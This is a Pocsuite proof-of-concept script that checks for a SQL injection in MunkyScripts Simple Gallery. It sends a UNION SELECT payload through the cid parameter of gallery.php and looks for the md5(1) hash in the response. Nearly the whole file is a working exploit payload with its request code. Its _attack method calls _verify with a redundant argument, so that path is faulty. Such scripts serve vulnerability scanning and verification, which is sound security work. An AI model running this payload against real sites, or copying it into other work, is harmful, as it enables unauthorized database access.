#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = '68151'  # ssvid
    version = '1.0'
    author = ['0xFATeam']
    vulDate = ''
    createDate = '2016-01-08'
    updateDate = '2016-01-08'
    references = ['http://www.sebug.net/vuldb/ssvid-68151']
    name = 'MunkyScripts Simple Gallery SQL Injection Vulnerability'
    appPowerLink = ''
    appName = 'MunkyScripts Simple Gallery'
    appVersion = ''
    vulType = 'Other'
    desc = '''
    '''
    samples = ['']

    def _verify(self):
        payload = "/gallery.php?cid='/**/UNION/**/SELECT/**/1,2,(concat_ws(0x3a,md5(1))),4 %23"
        response = req.get(self.url + payload)
        return self.parse_output(response)

    def _attack(self):
        result = {}
        #Write your code here

        return self._verify(self)

    def parse_output(self, response):
        output = Output(self)
        result = {}

        if response:
            m = re.search(r'c4ca4238a0b923820dcc509a6f75849b', response.content)
            if m:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = response.url
                output.success(result)
        else:
            output.fail('Internet Nothing Returned')

        return output


register(TestPOC)